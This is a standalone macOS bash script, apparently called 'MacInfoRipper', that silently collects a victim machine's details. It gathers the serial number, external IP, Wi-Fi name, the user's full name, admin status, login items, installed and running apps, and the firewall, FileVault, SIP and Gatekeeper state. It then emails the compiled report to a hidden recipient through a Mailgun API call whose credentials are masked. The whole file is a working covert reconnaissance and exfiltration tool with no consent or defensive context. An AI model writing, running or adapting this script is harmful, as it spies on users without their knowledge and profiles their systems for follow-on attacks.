#!/bin/bash


# basic information
computerName=$(scutil --get ComputerName)
hostName=$(scutil --get HostName 2>/dev/null || echo "Not defined")
localHostName=$(scutil --get LocalHostName)
userName=$(whoami)
macOSVersion=$(sw_vers -productVersion)
macOSBuild=$(sw_vers -buildVersion)
kernelVersion=$(uname -r)
ipAddress=$(ipconfig getifaddr en0 || ipconfig getifaddr en1)
externalIP=$(curl -s https://api.ipify.org)
dateTime=$(date)
serialNumber=$(ioreg -l | grep IOPlatformSerialNumber | awk '{print $4}' | sed 's/"//g')
timezone=$(systemsetup -gettimezone | awk -F': ' '{print $2}')

# computer information
modelName=$(system_profiler SPHardwareDataType | grep "Model Name" | awk -F': ' '{print $2}')
modelIdentifier=$(system_profiler SPHardwareDataType | grep "Model Identifier" | awk -F': ' '{print $2}')
processorInfo=$(sysctl -n machdep.cpu.brand_string)
processorCores=$(sysctl -n hw.physicalcpu)
processorThreads=$(sysctl -n hw.logicalcpu)
memoryInfo=$(system_profiler SPHardwareDataType | grep "Memory" | awk -F': ' '{print $2}')
diskSpace=$(df -h / | awk 'NR==2 {print "Total: "$2", Used: "$3", Available: "$4", Usage: "$5}')
startupDisk=$(system_profiler SPSoftwareDataType | grep "Boot Volume" | awk -F': ' '{print $2}')
graphicsInfo=$(system_profiler SPDisplaysDataType | grep -A 3 "Chipset Model" | grep -v "Displays:" | awk -F': ' '{print $2}' | paste -sd "," -)
batteryStatus=$(pmset -g batt | grep -o '[0-9]*%')
batteryCycles=$(system_profiler SPPowerDataType 2>/dev/null | grep "Cycle Count" | awk -F': ' '{print $2}')
uptime=$(uptime | awk '{print $3,$4,$5}' | sed 's/,$//')
bluetoothStatus=$(system_profiler SPBluetoothDataType 2>/dev/null | grep -A 1 "State" | grep "Connected" | awk -F': ' '{print $2}')
wifiName=$(networksetup -getairportnetwork en0 2>/dev/null | awk -F': ' '{print $2}')

# User information
fullName=$(id -F)
homeDirectory=$(eval echo ~$userName)
shellType=$(echo $SHELL)
lastLogin=$(last -1 $userName | awk 'NR==1{print $4, $5, $6, $7}')
groupMembership=$(groups $userName)
adminStatus=$(dseditgroup -o checkmember -m $userName admin | awk '{print $1}')
userLanguage=$(defaults read -g AppleLocale)
userCreationDate=$(stat -f "%SB" /Users/$userName)
loginItems=$(osascript -e 'tell application "System Events" to get the name of every login item' 2>/dev/null || echo "Not available")

# App and system information
installedApps=$(find /Applications -maxdepth 1 -type d -name "*.app" | sed 's|/Applications/||' | sed 's/.app$//' | sort)
recentApps=$(osascript -e 'tell application "System Events" to get the name of every process whose background only is false' 2>/dev/null)


# Security information
firewallStatus=$(defaults read /Library/Preferences/com.apple.alf globalstate 2>/dev/null || echo "Unknown")
case $firewallStatus in
  0) firewallStatus="Disabled" ;;
  1) firewallStatus="Enabled for specific services" ;;
  2) firewallStatus="Enabled for all services" ;;
esac
filevaultStatus=$(fdesetup status | awk -F': ' '{print $2}')
systemIntegrity=$(csrutil status | awk -F': ' '{print $2}')
gatekeeper=$(spctl --status | awk '{print $2}')

# Create message
messageBody=$'DETAILED COMPUTER REPORT\n'
messageBody+=$'==============================\n\n'

messageBody+=$'--- SYSTEM INFORMATION ---\n'
messageBody+=$'Date and Time: '"$dateTime"$'\n'
messageBody+=$'Computer Name: '"$computerName"$'\n'
messageBody+=$'Host Name: '"$hostName"$'\n'
messageBody+=$'Local Host Name: '"$localHostName"$'\n'
messageBody+=$'macOS Version: '"$macOSVersion"$'\n'
messageBody+=$'macOS Build: '"$macOSBuild"$'\n'
messageBody+=$'Kernel Version: '"$kernelVersion"$'\n'
messageBody+=$'Time Zone: '"$timezone"$'\n'
messageBody+=$'Local IP Address: '"$ipAddress"$'\n'
messageBody+=$'External IP Address: '"$externalIP"$'\n'
messageBody+=$'Serial Number: '"$serialNumber"$'\n\n'

messageBody+=$'--- HARDWARE INFORMATION ---\n'
messageBody+=$'Model: '"$modelName"$'\n'
messageBody+=$'Model Identifier: '"$modelIdentifier"$'\n'
messageBody+=$'Processor: '"$processorInfo"$'\n'
messageBody+=$'Physical Cores: '"$processorCores"$'\n'
messageBody+=$'Threads: '"$processorThreads"$'\n'
messageBody+=$'Memory: '"$memoryInfo"$'\n'
messageBody+=$'Disk Space: '"$diskSpace"$'\n'
messageBody+=$'Startup Disk: '"$startupDisk"$'\n'
messageBody+=$'Graphics Card: '"$graphicsInfo"$'\n'
messageBody+=$'Battery: '"$batteryStatus"$'\n'
messageBody+=$'Battery Cycles: '"$batteryCycles"$'\n'
messageBody+=$'Uptime: '"$uptime"$'\n'
messageBody+=$'WiFi Network: '"$wifiName"$'\n'
messageBody+=$'Bluetooth Devices: '"$bluetoothStatus"$'\n\n'

messageBody+=$'--- USER INFORMATION ---\n'
messageBody+=$'Username: '"$userName"$'\n'
messageBody+=$'Full Name: '"$fullName"$'\n'
messageBody+=$'Home Directory: '"$homeDirectory"$'\n'
messageBody+=$'Shell: '"$shellType"$'\n'
messageBody+=$'Account Created On: '"$userCreationDate"$'\n'
messageBody+=$'Last Login: '"$lastLogin"$'\n'
messageBody+=$'Language: '"$userLanguage"$'\n'
messageBody+=$'Admin: '"$adminStatus"$'\n'
messageBody+=$'Groups: '"$groupMembership"$'\n'
messageBody+=$'Login Items: '"$loginItems"$'\n\n'

messageBody+=$'--- SECURITY ---\n'
messageBody+=$'Firewall: '"$firewallStatus"$'\n'
messageBody+=$'FileVault: '"$filevaultStatus"$'\n'
messageBody+=$'System Integrity Protection: '"$systemIntegrity"$'\n'
messageBody+=$'Gatekeeper: '"$gatekeeper"$'\n\n'

messageBody+=$'--- INSTALLED APPLICATIONS (TOP 10) ---\n'
appCount=0
while IFS= read -r app; do
  messageBody+=$'- '"$app"$'\n'
  ((appCount++))
  if [ $appCount -ge 10 ]; then break; fi
done <<< "$installedApps"
messageBody+=$'\n'

messageBody+=$'--- RUNNING APPLICATIONS (TOP 10) ---\n'
appCount=0
while IFS= read -r app; do
  messageBody+=$'- '"$app"$'\n'
  ((appCount++))
  if [ $appCount -ge 10 ]; then break; fi
done <<< "$recentApps"
messageBody+=$'\n'

messageBody+=$'==============================\n'
messageBody+=$'Report generated on '"$dateTime"$'\n'

# Send via Mailgun
curl -s --user 'api:*************************************' \
    https://api.mailgun.net/v3/sandbox*************************************.mailgun.org/messages \
    -F from='MacInfoRipper <postmaster@sandbox*************************************.mailgun.org>' \
    -F to=**********@******.com \
    -F subject='Mac Report' \
    -F text="$messageBody"

